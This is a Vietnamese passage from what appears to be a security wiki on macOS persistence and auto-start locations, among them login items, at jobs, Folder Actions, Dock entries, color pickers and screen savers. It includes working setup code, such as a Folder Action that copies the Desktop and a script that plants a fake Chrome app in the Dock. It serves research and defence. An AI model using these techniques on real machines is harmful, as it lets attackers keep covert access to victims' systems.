Trong **System Settings → General → Login Items & Extensions**, người dùng có thể xem lại các mục đăng nhập và chạy nền. macOS 13 trở lên cung cấp [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) để đăng ký login item, launch agent và launch daemon được đóng gói. [`Hành vi của register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) khác nhau tùy theo loại và trạng thái phê duyệt. **Chỉ ghi một helper vào app bundle là chưa đủ để đăng ký login item mới.** Ngược lại, nếu executable của helper đã đăng ký có thể ghi được, việc thay đổi executable đó có thể ảnh hưởng đến lần khởi chạy tiếp theo mà không cần đăng ký lại; trước tiên hãy xác minh đường dẫn thực tế và các bước kiểm tra code-signing.

Dưới đây là cách chỉ đọc để tìm các helper được đóng gói trên máy Mac; cách này không đăng ký hay khởi chạy bất kỳ helper nào:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Đối với plist launch được đóng gói, hãy phân giải `BundleProgram` **tương đối với thư mục gốc của app bundle** (ví dụ: `Contents/MacOS/Helper`), như [hướng dẫn di chuyển Service Management của Apple](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) nêu rõ. Một lần kiểm kê chỉ đọc thư mục `/Applications` trên máy Mac dùng cho nghiên cứu tìm thấy 14 mục helper được đóng gói và năm khai báo `BundleProgram`; cả năm đích đều được phân giải, và hai đích vượt qua bước kiểm tra khả năng ghi của người dùng. Bước kiểm tra đó **không chứng minh** rằng helper nào trong hai helper đã được đăng ký, bật, có thể thực thi sau khi xác thực chữ ký hoặc có thể được sandbox truy cập. `sfltool dumpbtm` liệt kê 150 bản ghi có tên trên máy Mac này; đây là công cụ hỗ trợ kiểm tra, không phải phép thử xác nhận mọi bản ghi đều đang chạy.

Các login item cũ hơn cũng có thể được quản lý thông qua Apple events. Có thể liệt kê, thêm và xóa chúng từ dòng lệnh, dù việc thêm sẽ thay đổi cấu hình đăng nhập được lưu lâu dài của người dùng và có thể cần phê duyệt Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` là chi tiết triển khai, không phải vị trí được hỗ trợ để cài payload chỉ bằng cách ghi một tệp. API `SMLoginItemSetEnabled` cũ đã được thay thế cho các helper mới bằng `SMAppService`; đường dẫn `/var/db/com.apple.xpc.launchd/loginitems.501.plist` trước đây được nêu trên trang không tồn tại trên máy thử nghiệm macOS 26.5.2. Khi đánh giá các Login Item hiện đại, hãy dùng API đăng ký và trạng thái UI của hệ thống, thay vì giả định có một đường dẫn cơ sở dữ liệu.

### ZIP làm Login Item

(Xem phần trước về Login Item, đây là phần mở rộng)

Nếu bạn lưu một tệp **ZIP** làm **Login Item**, **`Archive Utility`** sẽ mở tệp đó. Nếu ZIP chẳng hạn được lưu trong `~/Library` và chứa thư mục **`LaunchAgents/file.plist`** có backdoor, thư mục đó sẽ được tạo (mặc định không có) và plist sẽ được thêm vào. Vì vậy, lần tiếp theo người dùng đăng nhập, **backdoor được chỉ định trong plist sẽ được thực thi**.

Một lựa chọn khác là tạo các tệp **`.bash_profile`** và **`.zshenv`** trong thư mục HOME của người dùng, để kỹ thuật này vẫn hoạt động nếu thư mục LaunchAgents đã tồn tại.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng bạn cần **thực thi** **`at`** và nó phải được **bật**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- Cần **thực thi** **`at`** và nó phải được **bật**

#### **Mô tả**

Các tác vụ `at` được thiết kế để **lên lịch thực hiện tác vụ một lần** vào những thời điểm nhất định. Không giống cron job, các tác vụ `at` tự động bị xóa sau khi thực thi. Cần lưu ý rằng những tác vụ này vẫn tồn tại sau khi hệ thống khởi động lại, khiến chúng có thể trở thành mối lo ngại về bảo mật trong một số điều kiện nhất định.<sup>[[16]](#references)</sup>

Tệp `com.apple.atrun.plist` đi kèm có `Disabled = true`, nhưng launchd lưu riêng các giá trị ghi đè trạng thái bật/tắt có hiệu lực. Trên máy thử nghiệm macOS 26.5.2, `launchctl print-disabled system` báo cáo `com.apple.atrun` là **được bật**, bất chấp khóa đi kèm đó. Hãy kiểm tra trạng thái có hiệu lực trước khi kết luận rằng các job `at` sẽ chạy:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Quản trị viên có thể bật dịch vụ `atrun` đang bị tắt bằng `launchctl`; ví dụ lịch sử sau đây thay đổi trạng thái dịch vụ hệ thống và **không** được chạy trên máy Mac nghiên cứu:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Điều này sẽ tạo một tệp sau 1 giờ:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Kiểm tra hàng đợi công việc bằng `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Ở trên, chúng ta có thể thấy hai tác vụ được lên lịch. Có thể in thông tin chi tiết của tác vụ bằng lệnh `at -c JOBNUMBER`、】【

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Nếu các tác vụ AT không được bật, các tác vụ đã tạo sẽ không được thực thi.

Có thể tìm thấy **các tệp job** tại `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Tên tệp chứa hàng đợi, số công việc và thời điểm được lên lịch chạy. Ví dụ, hãy xem `a0001a019bdcd2`.

- `a` - đây là hàng đợi
- `0001a` - số công việc ở hệ thập lục phân, `0x1a = 26`
- `019bdcd2` - thời gian ở hệ thập lục phân. Nó biểu thị số phút đã trôi qua kể từ epoch. `0x019bdcd2` là `26991826` ở hệ thập phân. Nhân số này với 60, ta được `1619509560`, tương ứng với `GMT: 2021. April 27., Tuesday 7:46:00`.

Nếu in tệp công việc, ta sẽ thấy nó chứa cùng thông tin thu được bằng `at -c`.

### Cảnh báo mở tệp trong Calendar

- **Đích ghi:** Một app bundle có thể thực thi hoặc một tệp khác **đã được chọn** trong cảnh báo tùy chỉnh **Open file** của sự kiện Calendar. Việc tạo hoặc chỉnh sửa cảnh báo cần quyền truy cập vào sự kiện lịch đó thông qua Calendar hoặc một nguồn dữ liệu lịch được chấp thuận; ghi ngẫu nhiên vào một tệp không tạo ra cảnh báo.
- **Kích hoạt:** Thời điểm đã lên lịch của cảnh báo trên máy Mac nơi Calendar xử lý sự kiện. Sự kiện lặp lại có thể lặp lại hành động này. [Hướng dẫn Calendar hiện tại của Apple](https://support.apple.com/guide/calendar/icl1012/mac) xác nhận tùy chọn cảnh báo **Custom → Open file** trên macOS 26.
- **Danh tính thực thi và các điều kiện kiểm soát:** Calendar mở tệp đã chọn cho người dùng đang đăng nhập thông qua ứng dụng được liên kết với tệp đó. Khởi chạy app bundle có thể thực thi mã của nó với tư cách người dùng đó, tùy thuộc vào Gatekeeper, quarantine và các bước kiểm tra khác của macOS. Một tệp script thông thường có thể chỉ mở trong trình soạn thảo; riêng phần mở rộng của tệp không chứng minh rằng mã sẽ được thực thi.

Để đánh giá an toàn một đối tượng tiềm năng, hãy kiểm tra cảnh báo của sự kiện trong Calendar và quyền của tệp đã chọn. Đường thực thi này được ghi nhận dựa trên hướng dẫn của Apple và **không** được chạy trên máy Mac nghiên cứu vì thử nghiệm sẽ làm thay đổi một lịch đang hoạt động và phải chờ đến khi sự kiện trên desktop diễn ra. Có thể thử nghiệm bằng tài khoản dùng một lần: chọn app bundle chỉ tạo dấu hiệu, đặt cảnh báo Open file vào thời điểm gần sắp tới, xác nhận ứng dụng khởi chạy, rồi xóa sự kiện và ứng dụng sau đó.

### Tự động hóa Shortcuts trên macOS

- **Đích ghi:** Một tệp có thể thực thi **đã được tham chiếu** bởi một tác vụ của shortcut, hoặc một shortcut hiện có mà người dùng được ủy quyền có thể chỉnh sửa. Tệp `.shortcut` bất kỳ hoặc việc ghi vào cơ sở dữ liệu Shortcuts chưa được tài liệu hóa không phải là cách đăng ký tự động hóa được hỗ trợ.
- **Kích hoạt và danh tính:** Một sự kiện tự động hóa đã được cấu hình và bật từ trước, chẳng hạn thời điểm trong ngày hoặc sự kiện ứng dụng, sẽ gọi shortcut thay mặt người dùng đang đăng nhập. [Hướng dẫn tự động hóa Mac hiện tại của Apple](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) liệt kê các sự kiện được hỗ trợ, giải thích khi nào tự động hóa có thể chạy mà không cần hỏi và hướng dẫn cách xóa yếu tố kích hoạt. [Hướng dẫn quyền riêng tư Shortcuts của Apple](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) yêu cầu bật **Allow Running Scripts** cho các tác vụ script; từng tác vụ riêng lẻ vẫn có thể yêu cầu quyền.

Đây là đường thực thi có điều kiện từ ghi tệp **chỉ khi tác vụ hiện có tải một đích có thể ghi**. Việc tạo tự động hóa mới qua giao diện người dùng sẽ thay đổi cài đặt đang hoạt động và không được thử trên máy Mac nghiên cứu. Trong tài khoản dùng một lần, chủ tài khoản có thể cấu hình shortcut theo thời gian trong ngày, với script chạm vào `/tmp/ht-shortcuts-marker`, bật các quyền cần thiết, xác nhận dấu hiệu sau khi sự kiện diễn ra, rồi xóa tự động hóa, shortcut và dấu hiệu.

### Tác vụ Automator và Quick Actions

- **Đích ghi:** `~/Library/Automator/*.action` (người dùng) và `/Library/Automator/*.action` (quản trị viên) dành cho các action bundle. Quy trình Quick Action đã lưu thường nằm trong `~/Library/Services/*.workflow`; hãy kiểm tra đường dẫn workflow thực tế mà người dùng đã chọn. [Tài liệu tham khảo về framework Automator của Apple](https://developer.apple.com/documentation/automator) liệt kê các thư mục tìm kiếm action.
- **Kích hoạt:** Automator tải các action bundle khả dụng khi chạy, nhưng tác vụ của action chỉ chạy khi một workflow sử dụng nó được thực thi. Quick Action chạy khi người dùng chọn nó trong Finder, Services hoặc một menu khác được hiển thị. Workflow Folder Action chạy khi có mục được thêm vào thư mục **đã được gắn trước đó**; workflow Calendar Alarm chạy vào thời điểm của sự kiện. [Các loại workflow của Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) phân biệt các sự kiện này. Chỉ ghi một action hoặc workflow không gắn action vào thư mục hay lên lịch sự kiện lịch.
- **Danh tính thực thi và các điều kiện kiểm soát:** Tài khoản chạy workflow; Automator hoặc ứng dụng gọi phải tải được action, đồng thời các bước kiểm tra hiện hành về chữ ký mã và quyền riêng tư phải cho phép. Action bundle có thể ghi được và đã được workflow đang hoạt động tham chiếu là trường hợp khác với việc cài một action mới rồi chờ người dùng chọn.

Các thư mục `Automator` và `Services` của người dùng có trên máy Mac thử nghiệm chạy macOS 26.5.2; `/Library/Automator` không tồn tại. Không có workflow đang hoạt động nào được tạo, gắn hoặc thực thi. Hãy dùng tài khoản dùng một lần và action/workflow chỉ tạo dấu hiệu để xác nhận một đường dẫn tải cụ thể. Phần [Folder Actions](#folder-actions) riêng trình bày chi tiết hơn về nguồn sự kiện đó.

### Folder Actions

Bài viết: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Bài viết: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng bạn cần có khả năng gọi `osascript` với các đối số để liên hệ với **`System Events`** nhằm cấu hình Folder Actions
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Có một số quyền TCC cơ bản như Desktop, Documents và Downloads

#### Vị trí

- **`/Library/Scripts/Folder Action Scripts`**
  - Cần quyền root
  - **Kích hoạt**: Truy cập vào thư mục được chỉ định
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Kích hoạt**: Truy cập vào thư mục được chỉ định

#### Mô tả & khai thác

Folder Actions là các script tự động được kích hoạt bởi những thay đổi trong một thư mục, chẳng hạn như thêm, xóa mục hoặc các hành động khác như mở hay đổi kích thước cửa sổ thư mục. Có thể sử dụng các hành động này cho nhiều tác vụ và kích hoạt chúng theo nhiều cách, chẳng hạn qua giao diện Finder hoặc lệnh terminal.<sup>[[17]](#references)[[18]](#references)</sup>

Có một số cách để thiết lập Folder Actions:

1. Tạo workflow Folder Action bằng [Automator](https://support.apple.com/guide/automator/welcome/mac) và cài đặt nó dưới dạng một dịch vụ.
2. Gắn script thủ công qua Folder Actions Setup trong menu ngữ cảnh của một thư mục.
3. Dùng OSAScript để gửi thông điệp Apple Event đến `System Events.app` nhằm thiết lập Folder Action theo cách lập trình.
   - Phương pháp này đặc biệt hữu ích để nhúng action vào hệ thống, tạo ra một mức độ persistence.

Script sau đây là ví dụ về nội dung có thể được thực thi bởi một Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Để có thể sử dụng tập lệnh ở trên với Folder Actions, hãy biên dịch nó bằng:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Sau khi biên dịch script, hãy thiết lập Folder Actions bằng cách chạy script bên dưới. Script này sẽ bật Folder Actions trên toàn hệ thống và đính kèm script đã biên dịch trước đó vào thư mục Desktop.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Chạy script thiết lập bằng:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Đây là cách bạn triển khai persistence thông qua GUI:

Đây là script sẽ được thực thi:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Biên dịch bằng: `osacompile -l JavaScript -o folder.scpt source.js`

Di chuyển nó đến:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Sau đó, mở ứng dụng `Folder Actions Setup`, chọn **thư mục bạn muốn theo dõi** và trong trường hợp của bạn, chọn **`folder.scpt`** (trong trường hợp của tôi, tôi đặt tên là output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Bây giờ, nếu bạn mở thư mục đó bằng **Finder**, script của bạn sẽ được thực thi.

Cấu hình này được lưu trong **plist** tại **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dưới dạng base64.

Bây giờ, hãy thử thiết lập persistence này mà không cần truy cập GUI:

1. **Sao chép `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** vào `/tmp` để sao lưu:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Xóa** Folder Actions bạn vừa thiết lập:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Giờ đây, chúng ta có một môi trường trống

3. Sao chép tệp sao lưu: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Mở Folder Actions Setup.app để tải cấu hình này: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Cách này không hiệu quả với tôi, nhưng đó là hướng dẫn trong bài writeup:(

### Phím tắt Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Nhưng bạn cần cài một ứng dụng độc hại vào hệ thống
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- `~/Library/Preferences/com.apple.dock.plist`
  - **Kích hoạt**: Khi người dùng nhấp vào ứng dụng trong Dock

#### Mô tả & Khai thác

Tất cả ứng dụng xuất hiện trong Dock đều được chỉ định trong plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Có thể **thêm một ứng dụng** chỉ bằng cách:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Sử dụng một chút **social engineering**, bạn có thể **mạo danh, chẳng hạn như Google Chrome, trong dock** và thực thi script của riêng mình:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Phương thức nhập

- **Mục tiêu ghi:** Một app bundle phương thức nhập có chứa mã, được cài trong `~/Library/Input Methods/` (người dùng) hoặc `/Library/Input Methods/` (quản trị viên). Điều này khác với các tệp ánh xạ bàn phím `.inputplugin` dạng văn bản thuần của Apple, vốn không tự chúng chứa payload mã tùy ý.
- **Kích hoạt:** Người dùng thêm/bật nguồn nhập trong **Cài đặt hệ thống → Bàn phím → Nhập văn bản**, sau đó chọn hoặc sử dụng nguồn đó. Chỉ sao chép một bundle vào thư mục không chứng minh rằng macOS sẽ khởi chạy nó. [Hướng dẫn hiện tại về Nguồn nhập của Apple](https://support.apple.com/guide/mac-help/mchl84525d76/mac) mô tả cách bật và chuyển đổi nguồn; [tài liệu InputMethodKit của Apple](https://developer.apple.com/documentation/inputmethodkit) đề cập đến các phương thức nhập có chứa mã.
- **Danh tính thực thi và các điều kiện kiểm soát:** Phương thức chạy với quyền của người dùng đã đăng nhập, tùy thuộc vào việc đăng ký phương thức nhập, ký mã và các kiểm tra bảo mật hiện hành của macOS. Các phương thức hiện có đã bật nhưng có tệp thực thi cho phép ghi cần được kiểm tra riêng về đường dẫn và chữ ký.

Ghi chú cũ hơn của Apple về [phương thức nhập của bên thứ ba](https://developer.apple.com/library/archive/qa/qa1810/_index.html) đã cảnh báo rằng việc sao chép một số phương thức bảng màu vào các thư mục này thậm chí không làm chúng xuất hiện trong Nguồn nhập. Trên máy Mac nghiên cứu chạy macOS 26.5.2, thư mục người dùng tồn tại, nhưng không có bundle nào được cài đặt hoặc kích hoạt; do đó đây là một đường dẫn có điều kiện được ghi nhận, chứ không phải kết quả chạy thực tế trên máy.

### Bộ chọn màu

Bài viết: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Có thể hữu ích để vượt qua sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Cần thực hiện một thao tác rất cụ thể
  - Cuối cùng bạn sẽ ở trong một sandbox khác
- Vượt qua TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- `/Library/ColorPickers`
  - Cần quyền root
  - Kích hoạt: Sử dụng bộ chọn màu
- `~/Library/ColorPickers`
  - Kích hoạt: Sử dụng bộ chọn màu

#### Mô tả & khai thác

**Biên dịch** một bundle bộ chọn màu có chứa mã của bạn (ví dụ, bạn có thể dùng [**cái này**](https://github.com/viktorstrate/color-picker-plus)) và thêm một constructor (như trong phần [Trình bảo vệ màn hình](macos-auto-start-locations.md#screen-saver)), rồi sao chép bundle vào `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Sau đó, khi bộ chọn màu được kích hoạt, bundle của bạn cũng sẽ thực thi.

Điều này phụ thuộc vào việc một app tương thích mở bảng màu hệ thống và chọn bộ chọn đã cài đặt. [Hướng dẫn về bảng màu của Apple](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) mô tả các vị trí bundle cũ. Kiểm tra đường dẫn trên máy cho thấy có dịch vụ XPC bộ chọn màu cũ, nhưng không có bộ chọn nào được cài đặt hoặc tải trên máy Mac nghiên cứu; không nên suy luận rằng có thể vượt qua TCC chỉ từ đường dẫn này.

Lưu ý rằng binary tải thư viện của bạn chạy trong một **sandbox rất hạn chế**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Bài viết**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Bài viết**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Hữu ích để bypass sandbox: **Không, vì bạn cần thực thi ứng dụng của mình**
- Bypass TCC: Tùy thuộc vào sandbox và quyền của extension được bật; chưa có bypass tổng quát nào được xác lập.

#### Vị trí

- Một ứng dụng cụ thể

#### Mô tả & Khai thác

Có thể xem ví dụ về một ứng dụng có Finder Sync Extension [**tại đây**](https://github.com/D00MFist/InSync).

Ứng dụng có thể chứa `Finder Sync Extensions`. Extension này sẽ nằm bên trong một ứng dụng được thực thi. Ngoài ra, để có thể thực thi mã, extension **phải được ký** bằng chứng chỉ nhà phát triển Apple hợp lệ, phải được **sandbox** (mặc dù có thể thêm các ngoại lệ nới lỏng) và phải được đăng ký bằng lệnh tương tự như sau:<sup>[[21]](#references)[[22]](#references)</sup>

Extension đã cài đặt cũng cần được **bật** và được gọi cho vị trí hoặc mục Finder phù hợp; chỉ ghi một bundle `.appex` bất kỳ là chưa đủ. [Finder Sync API của Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) cung cấp thông tin về trạng thái bật. Các lệnh `pluginkit` bên dưới minh họa việc đăng ký và bật rõ ràng, chứ không phải cơ chế tự khởi chạy chỉ dựa trên tệp. Lộ trình này đã được rà soát tài liệu; không có extension mới nào được cài đặt hoặc bật trên máy Mac nghiên cứu.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Trình bảo vệ màn hình

Bài viết: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Bài viết: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng bạn sẽ kết thúc trong một sandbox ứng dụng thông thường
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- `/System/Library/Screen Savers`
  - Yêu cầu quyền root
  - **Kích hoạt**: Chọn trình bảo vệ màn hình
- `/Library/Screen Savers`
  - Yêu cầu quyền root
  - **Kích hoạt**: Chọn trình bảo vệ màn hình
- `~/Library/Screen Savers`
  - **Kích hoạt**: Chọn trình bảo vệ màn hình

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Mô tả & Khai thác

Tạo một project mới trong Xcode và chọn template để tạo một **Screen Saver** mới. Sau đó, thêm code của bạn vào đó, chẳng hạn như đoạn code sau để tạo log.<sup>[[23]](#references)[[24]](#references)</sup>

**Build** project rồi sao chép bundle `.saver` vào **`~/Library/Screen Savers`**. Sau đó, mở GUI Screen Saver và chỉ cần nhấp vào đó, nó sẽ tạo ra rất nhiều log:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Lưu ý rằng vì trong entitlements của binary nạp mã này (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) có **`com.apple.security.app-sandbox`**, nên bạn sẽ ở **trong sandbox ứng dụng thông thường**.

Mã Saver:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

bài phân tích: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng bạn sẽ bị giới hạn trong application sandbox
